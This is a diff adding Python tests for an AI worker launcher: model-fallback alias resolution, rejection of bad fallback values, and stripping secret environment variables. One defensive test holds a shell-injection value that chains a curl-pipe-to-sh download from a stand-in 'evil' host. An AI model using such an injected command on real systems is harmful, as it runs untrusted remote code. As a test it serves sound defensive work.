@@ -134,6 +134,36 @@ def test_fallback_model_auto_haiku_has_no_target(tmp_path: Path, monkeypatch) ->
     assert "--fallback-model" not in cmd
 
 
+def test_fallback_auto_recovers_full_id_alias(monkeypatch) -> None:
+    # a full model id (not a short alias) must be reverse-mapped to its alias
+    # before the downgrade lookup: claude-sonnet-4-6 → 'sonnet' → haiku
+    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
+    assert config._resolve_fallback_model(config._MODEL_ALIASES["sonnet"]) == config.HAIKU_MODEL
+
+
+def test_fallback_auto_unknown_model_returns_none(monkeypatch) -> None:
+    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
+    assert config._resolve_fallback_model("some-unknown-model") is None
+
+
+def test_fallback_model_rejects_non_model_value(tmp_path: Path, monkeypatch) -> None:
+    # SECURITY: a user-controlled setting is spliced into the worker shell command;
+    # a non-model value (injection / typo) must be dropped, never reach the shell.
+    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model",
+                        "haiku; curl -s http://evil/x | sh #")
+    cmd, _ = _worker(tmp_path, model="opus")._build_cmd_and_env(tmp_path / "t.md")
+    assert "--fallback-model" not in cmd
+    assert "curl" not in cmd and "evil" not in cmd
+
+
+def test_env_denylist_string_value_coerced(tmp_path: Path, monkeypatch) -> None:
+    # a bare-string setting must strip the whole var, not iterate its characters
+    monkeypatch.setenv("CLADE_ONE_SECRET", "leak-me")
+    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", "CLADE_ONE_SECRET")
+    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
+    assert "CLADE_ONE_SECRET" not in env
+
+
 def test_env_denylist_pops_keys(tmp_path: Path, monkeypatch) -> None:
     monkeypatch.setenv("CLADE_TEST_SECRET", "leak-me")
     monkeypatch.setenv("CLADE_TEST_KEEP", "ok")
